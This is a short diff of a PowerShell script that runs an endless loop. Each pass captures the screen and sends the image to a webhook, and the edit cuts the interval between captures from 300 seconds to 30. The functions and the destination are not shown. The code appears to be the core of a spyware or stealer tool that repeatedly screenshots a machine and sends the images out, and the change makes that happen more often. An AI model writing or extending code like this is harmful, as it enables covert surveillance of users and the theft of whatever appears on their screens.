@@ -39,5 +39,6 @@ function Send-ToWebhook($imagePath) {
 while($true) {
     $img = Capture-Screen
     Send-ToWebhook $img
-    Start-Sleep -Seconds 300
+    Start-Sleep -Seconds 30
+
 }
